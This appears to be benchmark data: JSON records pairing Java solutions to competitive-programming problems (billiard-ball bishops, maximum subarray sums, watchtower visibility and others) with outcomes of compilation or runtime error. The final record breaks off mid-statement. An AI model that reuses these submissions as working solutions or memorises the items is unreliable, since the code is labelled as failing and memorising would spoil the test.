{"difficulty":2100,"lang":"Java 6","lang_cluster":"java","src_uid":"05f251de93536024c05fbd77ed01b70b","submission_id":"re_1012","tags":["dsu","number theory","dfs and similar","graphs"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.io.*;\nimport java.util.*;\n\n\npublic class Test03 {\n\n\tpublic  void run() throws Exception{\n\t\tBufferedReader br = new BufferedReader(new InputStreamReader(System.in));\n\t\tString line = br.readLine();\n\t\tString[] lines = line.split(\"\\\\s+\");\n\t\tint n = Integer.parseInt(lines[0]);\n\t\tint m = Integer.parseInt(lines[1]);\n\t\t\n\t\tboolean[] f = new boolean[n+1];\n\t\t\n\t\tint ret = 0;\n\t\tfor(int i = 1; i <= n; i++){\n\t\t\tif(!f[i]){\n\t\t\t\tret++;\n\t\t\t\tif(i == n){\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tint yoko = 1;\n\t\t\t\tint tate = 1;\n\t\t\t\tint x = i;\n\t\t\t\tint y = 1;\n\t\t\t\tint motox = x;\n\t\t\t\tint motoy = y;\n\t\t\t\twhile(true){\n\t\t\t\t\tx += yoko;\n\t\t\t\t\ty += tate;\n\t\t\t\t\tif(x == 1 && y == 1){\n\t\t\t\t\t\tyoko = 1;\n\t\t\t\t\t\ttate = 1;\n\t\t\t\t\t}\n\t\t\t\t\telse if(x == n && y == 1){\n\t\t\t\t\t\tyoko = -1;\n\t\t\t\t\t\ttate = 1;\n\t\t\t\t\t}\n\t\t\t\t\telse if(x == 1 && y == m){\n\t\t\t\t\t\tyoko = 1;\n\t\t\t\t\t\ttate = -1;\n\t\t\t\t\t}\n\t\t\t\t\telse if(x == n && y == m){\n\t\t\t\t\t\tyoko = -1;\n\t\t\t\t\t\ttate = -1;\n\t\t\t\t\t}\n\t\t\t\t\telse if(x == 1){\n\t\t\t\t\t\tyoko = 1;\n\t\t\t\t\t}\n\t\t\t\t\telse if(x == n){\n\t\t\t\t\t\tyoko = -1;\n\t\t\t\t\t}\n\t\t\t\t\telse if(y == 1){\n\t\t\t\t\t\ttate = 1;\n\t\t\t\t\t}\n\t\t\t\t\telse if(y == m){\n\t\t\t\t\t\ttate = -1;\n\t\t\t\t\t}\n\t\t\t\t\tif(y == 1){\n\t\t\t\t\t\tf[x] = true;\n\t\t\t\t\t}\n\t\t\t\t\tif(x == motox && y == motoy && yoko == 1 && tate == 1){\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\t\n\t\tSystem.out.println(ret);\n\t}\n\t\n\t\/**\n\t * @param args\n\t *\/\n\tpublic static void main(String[] args) throws Exception{\n\t\tTest03 t = new Test03();\n\t\tt.run();\n\t}\n\n}\n","description":"Let's imagine: there is a chess piece billiard ball. Its movements resemble the ones of a bishop chess piece. The only difference is that when a billiard ball hits the board's border, it can reflect from it and continue moving.More formally, first one of four diagonal directions is chosen and the billiard ball moves in that direction. When it reaches the square located on the board's edge, the billiard ball reflects from it; it changes the direction of its movement by 90 degrees and continues moving. Specifically, having reached a corner square, the billiard ball is reflected twice and starts to move the opposite way. While it moves, the billiard ball can make an infinite number of reflections. At any square of its trajectory the billiard ball can stop and on that the move is considered completed.  It is considered that one billiard ball a beats another billiard ball b if a can reach a point where b is located.You are suggested to find the maximal number of billiard balls, that pairwise do not beat each other and that can be positioned on a chessboard n\u2009\u00d7\u2009m in size.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (2\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009106).","output_spec":"Print a single number, the maximum possible number of billiard balls that do not pairwise beat each other. Please do not use the %lld specificator to read or write 64-bit numbers in C++. It is preferred to use cin (also you may use the %I64d specificator).","notes":null,"sample_inputs":["3 4","3 3"],"sample_outputs":["2","3"]}
{"difficulty":1800,"lang":"Java 8","lang_cluster":"java","src_uid":"0a9cabb857949e818453ffe411f08f95","submission_id":"re_533","tags":["number theory","probabilities","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.OutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.PrintWriter;\nimport java.util.Scanner;\n\n\/**\n * Built using CHelper plug-in\n * Actual solution is at the top\n *\n * @author Aeroui\n *\/\npublic class Main {\n    public static void main(String[] args) {\n        InputStream inputStream = System.in;\n        OutputStream outputStream = System.out;\n        Scanner in = new Scanner(inputStream);\n        PrintWriter out = new PrintWriter(outputStream);\n        TaskD solver = new TaskD();\n        solver.solve(1, in, out);\n        out.close();\n    }\n\n    static class TaskD {\n        public void solve(int testNumber, Scanner in, PrintWriter out) {\n            int S = in.nextInt();\n            int a = in.nextInt();\n            int b = in.nextInt();\n            int c = in.nextInt();\n\n            int sum = a + b + c;\n            if (sum == 0) {\n                out.printf(\"%.6f %.6f %.6f\", 0, 0, 0);\n                return;\n            }\n\n            double da = (double) a \/ (double) sum;\n            double db = (double) b \/ (double) sum;\n            double dc = (double) c \/ (double) sum;\n\n            double ans1 = da * S;\n            double ans2 = db * S;\n            double ans3 = dc * S;\n\n            out.printf(\"%.12f %.12f %.12f\", ans1, ans2, ans3);\n        }\n\n    }\n}\n\n","description":"As you very well know, the whole Universe traditionally uses three-dimensional Cartesian system of coordinates. In this system each point corresponds to three real coordinates (x,\u2009y,\u2009z). In this coordinate system, the distance between the center of the Universe and the point is calculated by the following formula: . Mushroom scientists that work for the Great Mushroom King think that the Universe isn't exactly right and the distance from the center of the Universe to a point equals xa\u00b7yb\u00b7zc.To test the metric of mushroom scientists, the usual scientists offered them a task: find such x,\u2009y,\u2009z (0\u2009\u2264\u2009x,\u2009y,\u2009z;\u00a0x\u2009+\u2009y\u2009+\u2009z\u2009\u2264\u2009S), that the distance between the center of the Universe and the point (x,\u2009y,\u2009z) is maximum possible in the metric of mushroom scientists. The mushroom scientists aren't good at maths, so they commissioned you to do the task.Note that in this problem, it is considered that 00\u2009=\u20091.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer S (1\u2009\u2264\u2009S\u2009\u2264\u2009103) \u2014 the maximum sum of coordinates of the sought point. The second line contains three space-separated integers a, b, c (0\u2009\u2264\u2009a,\u2009b,\u2009c\u2009\u2264\u2009103) \u2014 the numbers that describe the metric of mushroom scientists.","output_spec":"Print three real numbers \u2014 the coordinates of the point that reaches maximum value in the metrics of mushroom scientists. If there are multiple answers, print any of them that meets the limitations. A natural logarithm of distance from the center of the Universe to the given point in the metric of mushroom scientists shouldn't differ from the natural logarithm of the maximum distance by more than 10\u2009-\u20096. We think that ln(0)\u2009=\u2009\u2009-\u2009\u221e.","notes":null,"sample_inputs":["3\n1 1 1","3\n2 0 0"],"sample_outputs":["1.0 1.0 1.0","3.0 0.0 0.0"]}
{"difficulty":2400,"lang":"Java 6","lang_cluster":"java","src_uid":"0f49b4a5696ee71ebbc8f83d1ec3b901","submission_id":"re_878","tags":["number theory","math"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.util.*;\nimport java.io.*;\n\npublic class Solution {\n    int solve(int n, int x, int[] a) {\n        Arrays.sort(a);\n        \n        if (x == 2)\n            return 0;\n        \n        if (a.length == 0)\n            return -1;\n        \n        if (a[0] == 1)\n            return 1;\n        \n        int MAX = 2000001;\n        \n        boolean[] isPrime = new boolean[MAX];\n        Arrays.fill(isPrime, true);\n        int primeCnt = 0;\n        for (int i=2; i < x; i++) if (isPrime[i]) {\n            if (Arrays.binarySearch(a, i) < 0)\n                return -1;\n            \n            primeCnt++;\n            for (int j = 2*i; j < MAX; j += i)\n                isPrime[j] = false;\n        }\n        \n        return primeCnt;\n    }\n    \n    int bruteForce(int n, int x, int[] a) {\n        int[][] sign = new int[x+1][n];\n        for (int i=2; i<=x; i++)\n            for (int j=0; j<n; j++)\n                sign[i][j] = (i + a[j] - 1) \/ a[j];\n        \n        for (int i=2; i<x; i++)\n            if (Arrays.equals(sign[i], sign[i+1]))\n                return -1;\n        \n        int ans = n + 1;\n        for (int mask=0; mask < (1<<n); mask++) {\n            boolean ok = true;\n            for (int i=2; i<x; i++) {\n                boolean eq = true;\n                for (int j=0; j < n; j++) if ((mask & (1<<j)) != 0 && sign[i][j] != sign[i+1][j]) {\n                    eq = false;\n                    break;\n                }\n                if (eq) {\n                    ok = false;\n                    break;\n                }\n            }\n            if (ok) ans = Math.min(ans, Integer.bitCount(mask));\n        }\n        \n        return ans;\n    }\n    \n    public void go() throws Exception {\n        int n = -1, x = -1;\n        int[] a;\n        try {\n            BufferedReader br = new BufferedReader(new InputStreamReader(System.in));\n            StringTokenizer st = new StringTokenizer(br.readLine().trim());\n            n = Integer.parseInt(st.nextToken());\n            if (n<0 || n>100000) while (true);\n            x = Integer.parseInt(st.nextToken());\n            if (x<2 || x>1000000000) while (true);\n            st = new StringTokenizer(br.readLine().trim());\n            a = new int[n];\n            for (int i=0; i<n; i++) {\n                a[i] = Integer.parseInt(st.nextToken());\n                if (a[i]<1 || a[i]>1000000000) while (true);\n            }\n            br.close();\n        }\n        catch (Exception e) {\n            while (true);\n        }\n        \n        System.out.println(solve(n,x,a));\n    }\n    \n    public static void main(String[] args) throws Exception {\n        \/*Random rnd = new Random();\n        int it = 0;\n        while (true) {\n            it++;\n            if (it%1000==0) System.out.println(it);\n            int n = rnd.nextInt(11);\n            int x = rnd.nextInt(100-2+1)+2;\n            int max = rnd.nextInt(100) + 1;\n            int[] a = new int[n];\n            for (int i=0; i<n; i++) a[i] = rnd.nextInt(max) + 1;\n            \n            int ans1 = new Solution().solve(n,x,a.clone());\n            int ans2 = new Solution().bruteForce(n,x,a.clone());\n            \n            if (ans1 != ans2) {\n                System.out.println(n);\n                System.out.println(x);\n                for (int i=0; i < n; i++)\n                    System.out.println(a[i]);\n                \n                System.out.println(ans1+\" \"+ans2);\n                System.exit(0);\n            }\n        }*\/\n        (new Solution()).go();\n    }\n}\n","description":"Vasya plays The Elder Trolls III: Morrowindows. He has a huge list of items in the inventory, however, there is no limits on the size of things. Vasya does not know the total amount of items but he is sure that are not more than x and not less than 2 items in his inventory. A new patch for the game appeared to view inventory in n different modes. Displaying in mode i is a partition of all inventory items on pages, each of which (except for maybe the last one) shows exactly ai items. In addition, each mode shows how many pages bi is in a complete list. Great! Perhaps this information will be enough for Vasya to find the required number. Moreover, it is very interesting, what is the fewest number of modes in which Vasya can see inventory to determine the number of items in it?Vasya cannot use the information that was received while looking on inventory in some mode for selection of next actions. I. e. Vasya chooses some set of modes first, and then sees all the results and determines the size.Knowing the number of ai, x and assuming that Vasya is very smart, check whether he can uniquely determine the number of items in his inventory, and how many modes he will need to do that if he knows numbers ai, x and he is able to know number bi after viewing items in mode i.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and x (0\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20092\u2009\u2264\u2009x\u2009\u2264\u2009109). The second line contains integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009109). Some numbers among all ai may be equal.","output_spec":"Output the fewest amount of modes required to uniquely determine amount of items in the inventory. If there is no solution output \u2009-\u20091.","notes":"NoteIn the second example Vasya is not able to determine items count uniquely because 3 items, as well as 4 items, can be displayed on two pages.","sample_inputs":["2 4\n2 3","1 4\n2"],"sample_outputs":["2","-1"]}
{"difficulty":2000,"lang":"Java 8","lang_cluster":"java","src_uid":"13fa378c913bb7a15612327099b59f83","submission_id":"re_992","tags":["dp","greedy","math","implementation","data structures","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.util.Arrays;\nimport java.util.StringTokenizer;\n\npublic class P75D {\n\n    static boolean multipleIndependent = false;\n\n    void run() {\n        int n = in.nextInt(), m = in.nextInt();\n        int[][] arrays = new int[n][];\n        for (int i = 0; i < n; i++) {\n            arrays[i] = in.nextIntArray(in.nextInt());\n        }\n        int[] bigArray = in.nextIntArray(m);\n        long[] sums = new long[n];\n        long[] maxPrefixes = new long[n];\n        long[] maxPostfixes = new long[n];\n        long[] maxWithins = new long[n];\n        for (int i = 0; i < n; i++) {\n            sums[i] = sum(arrays[i]);\n            maxPrefixes[i] = maxPrefix(arrays[i]);\n            maxPostfixes[i] = maxPostfix(arrays[i]);\n            maxWithins[i] = maxWithin(arrays[i]);\n        }\n        long max = Long.MIN_VALUE;\n        long[][] dp = new long[m][2];\n        dp[0][0] = maxWithins[bigArray[0] - 1];\n        dp[0][1] = maxPostfixes[bigArray[0] - 1];\n        for (int i = 1; i < m; i++) {\n            int curArr = bigArray[i] - 1;\n            dp[i][0] = Math.max(maxWithins[curArr], dp[i - 1][1] + maxPrefixes[curArr]);\n            dp[i][1] = Math.max(maxPostfixes[curArr], dp[i - 1][1] + sums[curArr]);\n        }\n        for (long[] ls : dp) {\n            max = Math.max(max, ls[0]);\n            max = Math.max(max, ls[1]);\n        }\n        out.println(max);\n    }\n\n    long sum(int[] arr) {\n        long sum = 0;\n        for (int a : arr) {\n            sum += a;\n        }\n        return sum;\n    }\n\n    long maxPostfix(int[] arr) {\n        long max = Long.MIN_VALUE;\n        long sum = 0;\n        for (int i = arr.length - 1; i >= 0; i--) {\n            sum = sum + arr[i];\n            max = Math.max(max, sum);\n        }\n        return max;\n    }\n\n    long maxPrefix(int[] arr) {\n        long max = Long.MIN_VALUE;\n        long sum = 0;\n        for (int a : arr) {\n            sum = sum + a;\n            max = Math.max(max, sum);\n        }\n        return max;\n    }\n\n    long maxWithin(int[] arr) {\n        long max = Long.MIN_VALUE;\n        long sum = 0;\n        for (int a : arr) {\n            sum = Math.max(sum + a, 0);\n            max = Math.max(max, sum);\n        }\n        return max;\n    }\n\n    \/* -----: Template :----- *\/\n    static InputReader in;\n    static PrintWriter out;\n\n    public static void main(String[] args) {\n        try (PrintWriter o = new PrintWriter(new BufferedWriter(new OutputStreamWriter(System.out)))) {\n            in = new InputReader(System.in);\n            out = o;\n            int q = multipleIndependent ? in.nextInt() : 1;\n            while (q-- > 0) {\n                new P75D().run();\n            }\n        }\n    }\n\n    static Integer[] toWrapper(int[] arr) {\n        Integer[] res = new Integer[arr.length];\n        for (int i = 0; i < arr.length; i++) {\n            res[i] = arr[i];\n        }\n        return res;\n    }\n\n    static Integer[][] toWrapper(int[][] arr) {\n        Integer[][] res = new Integer[arr.length][];\n        for (int i = 0; i < arr.length; i++) {\n            res[i] = toWrapper(arr[i]);\n        }\n        return res;\n    }\n\n    static Long[] toWrapper(long[] arr) {\n        Long[] res = new Long[arr.length];\n        for (int i = 0; i < arr.length; i++) {\n            res[i] = arr[i];\n        }\n        return res;\n    }\n\n    static Long[][] toWrapper(long[][] arr) {\n        Long[][] res = new Long[arr.length][];\n        for (int i = 0; i < arr.length; i++) {\n            res[i] = toWrapper(arr[i]);\n        }\n        return res;\n    }\n\n    static class InputReader {\n\n        private final BufferedReader reader;\n        private StringTokenizer tokenizer;\n\n        public InputReader(InputStream stream) {\n            int bufferSize = 32 * 1024;\n            reader = new BufferedReader(new InputStreamReader(stream), bufferSize);\n            tokenizer = null;\n        }\n\n        public String next() {\n            while (tokenizer == null || !tokenizer.hasMoreTokens()) {\n                try {\n                    tokenizer = new StringTokenizer(reader.readLine());\n                } catch (IOException e) {\n                    throw new RuntimeException(e);\n                }\n            }\n            return tokenizer.nextToken();\n        }\n\n        public String nextLine() {\n            if (true) {\n                throw new RuntimeException(\"nextLine: not tested\");\n            }\n            while (tokenizer == null || !tokenizer.hasMoreTokens()) {\n                try {\n                    tokenizer = new StringTokenizer(reader.readLine());\n                } catch (IOException e) {\n                    throw new RuntimeException(e);\n                }\n            }\n            StringBuilder sb = new StringBuilder();\n            return tokenizer.nextToken(\"\\n\");\n        }\n\n        public int nextInt() {\n            return Integer.parseInt(next());\n        }\n\n        public long nextLong() {\n            return Long.parseLong(next());\n        }\n\n        public int[] nextIntArray(int n) {\n            int[] arr = new int[n];\n            for (int i = 0; i < n; i++) {\n                arr[i] = nextInt();\n            }\n            return arr;\n        }\n\n        public long[] nextLongArray(int n) {\n            long[] arr = new long[n];\n            for (int i = 0; i < n; i++) {\n                arr[i] = nextLong();\n            }\n            return arr;\n        }\n\n        public int[][] nextIntMap(int n, int m) {\n            int[][] map = new int[n][m];\n            for (int i = 0; i < n; i++) {\n                map[i] = nextIntArray(m);\n            }\n            return map;\n        }\n\n        public long[][] nextLongMap(int n, int m) {\n            long[][] map = new long[n][m];\n            for (int i = 0; i < n; i++) {\n                map[i] = nextLongArray(m);\n            }\n            return map;\n        }\n\n        public char[][] nextCharMap(int n) {\n            char[][] map = new char[n][];\n            for (int i = 0; i < n; i++) {\n                map[i] = next().toCharArray();\n            }\n            return map;\n        }\n    }\n}\n","description":"Ahmed and Mostafa used to compete together in many programming contests for several years. Their coach Fegla asked them to solve one challenging problem, of course Ahmed was able to solve it but Mostafa couldn't.This problem is similar to a standard problem but it has a different format and constraints.In the standard problem you are given an array of integers, and you have to find one or more consecutive elements in this array where their sum is the maximum possible sum.But in this problem you are given n small arrays, and you will create one big array from the concatenation of one or more instances of the small arrays (each small array could occur more than once). The big array will be given as an array of indexes (1-based) of the small arrays, and the concatenation should be done in the same order as in this array. Then you should apply the standard problem mentioned above on the resulting big array.For example let's suppose that the small arrays are {1, 6, -2}, {3, 3} and {-5, 1}. And the indexes in the big array are {2, 3, 1, 3}. So the actual values in the big array after formatting it as concatenation of the small arrays will be {3, 3, -5, 1, 1, 6, -2, -5, 1}. In this example the maximum sum is 9.Can you help Mostafa solve this problem?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m, n is the number of the small arrays (1\u2009\u2264\u2009n\u2009\u2264\u200950), and m is the number of indexes in the big array (1\u2009\u2264\u2009m\u2009\u2264\u2009250000). Then follow n lines, the i-th line starts with one integer l which is the size of the i-th array (1\u2009\u2264\u2009l\u2009\u2264\u20095000), followed by l integers each one will be greater than or equal -1000 and less than or equal 1000. The last line contains m integers which are the indexes in the big array, and you should concatenate the small arrays in the same order, and each index will be greater than or equal to 1 and less than or equal to n. The small arrays are numbered from 1 to n in the same order as given in the input. Some of the given small arrays may not be used in big array. Note, that the array is very big. So if you try to build it straightforwardly, you will probably get time or\/and memory limit exceeded.","output_spec":"Print one line containing the maximum sum in the big array after formatting it as described above. You must choose at least one element for the sum, i. e. it cannot be empty. Please, do not use %lld specificator to write 64-bit integers in C++. It is preferred to use cout (also you may use %I64d).","notes":null,"sample_inputs":["3 4\n3 1 6 -2\n2 3 3\n2 -5 1\n2 3 1 3","6 1\n4 0 8 -3 -10\n8 3 -2 -5 10 8 -9 -5 -4\n1 0\n1 -3\n3 -8 5 6\n2 9 6\n1"],"sample_outputs":["9","8"]}
{"difficulty":2500,"lang":"Java 8","lang_cluster":"java","src_uid":"1503f0379bf8d7f25c191ddea9278842","submission_id":"re_1104","tags":["geometry"],"exec_outcome":"RUNTIME_ERROR","source_code":"import javax.swing.*;\nimport java.io.PrintWriter;\nimport java.util.Scanner;\n\npublic class SaveTheCity {\n    public static int n;\n    public static Vertices[] vertices;\n    static class Vertices{\n        int x,y;\n        Vertices(int x, int y){\n            this.x=x;\n            this.y=y;\n        }\n    }\n\n    static long cross(int i, int j, int k){\n        long x1= vertices[j].x-vertices[i].x;\n        long y1= vertices[j].y-vertices[i].y;\n        long x2= vertices[k].x-vertices[i].x;\n        long y2= vertices[k].y-vertices[i].y;\n        return x1*y2-x2*y1;\n    }\n\n    public static void main(String[] args) {\n        Scanner cin= new Scanner(System.in);\n        PrintWriter pw= new PrintWriter(System.out);\n        n=cin.nextInt();\n        vertices= new Vertices[n];\n        for(int i=0;i<n;i++){\n            int x= cin.nextInt();\n            int y= cin.nextInt();\n            vertices[i]= new Vertices(x,y);\n        }\n        boolean change= vertices[0].x<vertices[1].x;\n        int x=vertices[1].x, y=vertices[1].y;\n        for(int i=0;i<n;i++){\n            vertices[i].x-=x;\n            vertices[i].y-=y;\n            if(change){\n                vertices[i].x=-vertices[i].x;\n                vertices[i].y=-vertices[i].y;\n            }\n        }\n        int l=0,r=vertices[0].x;\n        for(int i=2;i+1<n;i++){\n            long crossLeft=cross(i,i+1,0);\n            long crossRight= cross(i,i+1,1);\n            if(crossRight>0 && crossLeft>0){\n                pw.println(0);\n                return;\n            }\n            int x0 = vertices[i].x, y0 = vertices[i].y, x1 = vertices[i + 1].x, y1 = vertices[i + 1].y;\n            if (crossRight > 0 || crossLeft > 0) {\n                long p = (long) x0 * (y1 - y0) - (long) y0 * (x1 - x0);\n                long q = y1 - y0;\n                if (q < 0) {\n                    p = -p; q = -q;\n                }\n                if (crossRight > 0)\n                    r = Math.min(r, (int) (p \/ q));\n                else\n                    l = Math.max(l, (int) ((p + q - 1) \/ q));\n            }\n        }\n        pw.println(l<=r?r-l+1:0);\n\n    }\n\n}\n","description":"In the town of Aalam-Aara (meaning the Light of the Earth), previously there was no crime, no criminals but as the time progressed, sins started creeping into the hearts of once righteous people. Seeking solution to the problem, some of the elders found that as long as the corrupted part of population was kept away from the uncorrupted part, the crimes could be stopped. So, they are trying to set up a compound where they can keep the corrupted people. To ensure that the criminals don't escape the compound, a watchtower needs to be set up, so that they can be watched.Since the people of Aalam-Aara aren't very rich, they met up with a merchant from some rich town who agreed to sell them a land-plot which has already a straight line fence AB along which a few points are set up where they can put up a watchtower. Your task is to help them find out the number of points on that fence where the tower can be put up, so that all the criminals can be watched from there. Only one watchtower can be set up. A criminal is watchable from the watchtower if the line of visibility from the watchtower to him doesn't cross the plot-edges at any point between him and the tower i.e. as shown in figure 1 below, points X, Y, C and A are visible from point B but the points E and D are not.    Figure 1     Figure 2 Assume that the land plot is in the shape of a polygon and coordinate axes have been setup such that the fence AB is parallel to x-axis and the points where the watchtower can be set up are the integer points on the line. For example, in given figure 2, watchtower can be setup on any of five integer points on AB i.e. (4,\u20098), (5,\u20098), (6,\u20098), (7,\u20098) or (8,\u20098). You can assume that no three consecutive points are collinear and all the corner points other than A and B, lie towards same side of fence AB. The given polygon doesn't contain self-intersections.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the test case will consist of the number of vertices n (3\u2009\u2264\u2009n\u2009\u2264\u20091000). Next n lines will contain the coordinates of the vertices in the clockwise order of the polygon. On the i-th line are integers xi and yi (0\u2009\u2264\u2009xi,\u2009yi\u2009\u2264\u2009106) separated by a space. The endpoints of the fence AB are the first two points, (x1,\u2009y1) and (x2,\u2009y2).","output_spec":"Output consists of a single line containing the number of points where the watchtower can be set up.","notes":"NoteFigure 2 shows the first test case. All the points in the figure are watchable from any point on fence AB. Since, AB has 5 integer coordinates, so answer is 5.For case two, fence CD and DE are not completely visible, thus answer is 0.","sample_inputs":["5\n4 8\n8 8\n9 4\n4 0\n0 4","5\n4 8\n5 8\n5 4\n7 4\n2 2"],"sample_outputs":["5","0"]}
{"difficulty":1900,"lang":"Java 8","lang_cluster":"java","src_uid":"1670a3d7dba83e29e98f0ac6fe4acb18","submission_id":"re_1123","tags":["data structures","greedy","trees"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.io.*;\nimport java.util.*;\n\npublic class Main {\n\n  public static void main(String[] args) {\n\n      Scanner sc = new Scanner(file);\n\n      int N = sc.nextInt();\n      boolean possible = true;\n      boolean check = true;\n      int[] numOfWord = new int[1001];\n      int[] word = new int[N];\n\n      for (int i = 0; i < N; i++) {\n        int temp = sc.nextInt();\n        numOfWord[temp]++;\n        if (temp != 1 && numOfWord[temp] != 0)\n          check = false;\n        if ((temp != 1 && numOfWord[temp] > 1) || (!check && numOfWord[1] > 1)) {\n          possible = false;\n          break;\n        }\n        word[i] = temp;\n      }\n\n      if (!possible) {\n        System.out.println(\"NO\");\n        return;\n      }\n\n      System.out.println(\"YES\");\n\n      for (int i = 0; i < N; i++) {\n        for (int j = 0; j < word[i] - 1; j++)\n          System.out.print(1);\n        System.out.println(0);\n      }\n\n      sc.close();\n\n  }\n\n}\n","description":"Berland scientists know that the Old Berland language had exactly n words. Those words had lengths of l1,\u2009l2,\u2009...,\u2009ln letters. Every word consisted of two letters, 0 and 1. Ancient Berland people spoke quickly and didn\u2019t make pauses between the words, but at the same time they could always understand each other perfectly. It was possible because no word was a prefix of another one. The prefix of a string is considered to be one of its substrings that starts from the initial symbol.Help the scientists determine whether all the words of the Old Berland language can be reconstructed and if they can, output the words themselves.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer N (1\u2009\u2264\u2009N\u2009\u2264\u20091000) \u2014 the number of words in Old Berland language. The second line contains N space-separated integers \u2014 the lengths of these words. All the lengths are natural numbers not exceeding 1000.","output_spec":"If there\u2019s no such set of words, in the single line output NO. Otherwise, in the first line output YES, and in the next N lines output the words themselves in the order their lengths were given in the input file. If the answer is not unique, output any.","notes":null,"sample_inputs":["3\n1 2 3","3\n1 1 1"],"sample_outputs":["YES\n0\n10\n110","NO"]}
{"difficulty":2100,"lang":"Java 7","lang_cluster":"java","src_uid":"1c74a21045b2d312f68565bdaaaa8a7b","submission_id":"re_1300","tags":["dp","two pointers","greedy"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.io.*;\nimport java.util.*;\n\npublic class CF229D {\n\tFastScanner in;\n\tPrintWriter out;\n\n\tvoid solve() {\n\t\tint n = in.nextInt();\n\t\tint[] h = new int[n];\n\t\tfor (int i = 0; i < n; i++)\n\t\t\th[i] = in.nextInt();\n\t\tint[] sum = new int[n];\n\t\tfor (int i = 0; i < n; i++)\n\t\t\tsum[i] = (i == 0 ? 0 : sum[i - 1]) + h[i];\n\t\tint[][] dp = new int[n][n];\n\t\tfor (int i = 0; i < n; i++)\n\t\t\tfor (int j = 0; j < n; j++)\n\t\t\t\tdp[i][j] = Integer.MAX_VALUE;\n\t\tfor (int i = 0; i < n; i++)\n\t\t\tdp[i][0] = i;\n\t\tfor (int used = 0; used < n; used++)\n\t\t\tfor (int last = 0; last < n; last++)\n\t\t\t\tif (dp[used][last] != Integer.MAX_VALUE) {\n\t\t\t\t\tif (used < n - 1) \n\t\t\t\t\t\tdp[used + 1][last] = Math.min(dp[used + 1][last], dp[used][last] + 1);\n\t\t\t\t\tint curSum = sum[used] - (used > last ? sum[used - last - 1] : 0);\n\t\t\t\t\tif (sum[n - 1] - sum[used] < curSum)\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\tint l = 0, r = n - 1 - used;\n\t\t\t\t\twhile (r - l > 1) {\n\t\t\t\t\t\tint m = (l + r) \/ 2;\n\t\t\t\t\t\tif (sum[m] - sum[used] >= curSum) {\n\t\t\t\t\t\t\tr = m;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tl = m;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tdp[used + r][used + 1] = Math.min(dp[used + r][used + 1], dp[used][last] + r - 1);\n\t\t\t\t}\n\t\tint ans = Integer.MAX_VALUE;\n\t\tfor (int i = 0; i < n; i++)\n\t\t\tans = Math.min(ans, dp[n - 1][i]);\n\t\tout.println(ans);\n\t}\n\n\tvoid run() {\n\t\ttry {\n\t\t\tin = new FastScanner(new File(\"object.in\"));\n\t\t\tout = new PrintWriter(new File(\"object.out\"));\n\n\t\t\tsolve();\n\n\t\t\tout.close();\n\t\t} catch (FileNotFoundException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\n\tvoid runIO() {\n\n\t\tin = new FastScanner(System.in);\n\t\tout = new PrintWriter(System.out);\n\n\t\tsolve();\n\n\t\tout.close();\n\t}\n\n\tclass FastScanner {\n\t\tBufferedReader br;\n\t\tStringTokenizer st;\n\n\t\tpublic FastScanner(File f) {\n\t\t\ttry {\n\t\t\t\tbr = new BufferedReader(new FileReader(f));\n\t\t\t} catch (FileNotFoundException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t}\n\n\t\tpublic FastScanner(InputStream f) {\n\t\t\tbr = new BufferedReader(new InputStreamReader(f));\n\t\t}\n\n\t\tString next() {\n\t\t\twhile (st == null || !st.hasMoreTokens()) {\n\t\t\t\tString s = null;\n\t\t\t\ttry {\n\t\t\t\t\ts = br.readLine();\n\t\t\t\t} catch (IOException e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t}\n\t\t\t\tif (s == null)\n\t\t\t\t\treturn null;\n\t\t\t\tst = new StringTokenizer(s);\n\t\t\t}\n\t\t\treturn st.nextToken();\n\t\t}\n\n\t\tboolean hasMoreTokens() {\n\t\t\twhile (st == null || !st.hasMoreTokens()) {\n\t\t\t\tString s = null;\n\t\t\t\ttry {\n\t\t\t\t\ts = br.readLine();\n\t\t\t\t} catch (IOException e) {\n\t\t\t\t\te.printStackTrace();\n\t\t\t\t}\n\t\t\t\tif (s == null)\n\t\t\t\t\treturn false;\n\t\t\t\tst = new StringTokenizer(s);\n\t\t\t}\n\t\t\treturn true;\n\t\t}\n\n\t\tint nextInt() {\n\t\t\treturn Integer.parseInt(next());\n\t\t}\n\n\t\tlong nextLong() {\n\t\t\treturn Long.parseLong(next());\n\t\t}\n\t}\n\n\tpublic static void main(String[] args) {\n\t\tnew CF229D().runIO();\n\t}\n}","description":"The city of D consists of n towers, built consecutively on a straight line. The height of the tower that goes i-th (from left to right) in the sequence equals hi. The city mayor decided to rebuild the city to make it beautiful. In a beautiful city all towers are are arranged in non-descending order of their height from left to right.The rebuilding consists of performing several (perhaps zero) operations. An operation constitutes using a crane to take any tower and put it altogether on the top of some other neighboring tower. In other words, we can take the tower that stands i-th and put it on the top of either the (i\u2009-\u20091)-th tower (if it exists), or the (i\u2009+\u20091)-th tower (of it exists). The height of the resulting tower equals the sum of heights of the two towers that were put together. After that the two towers can't be split by any means, but more similar operations can be performed on the resulting tower. Note that after each operation the total number 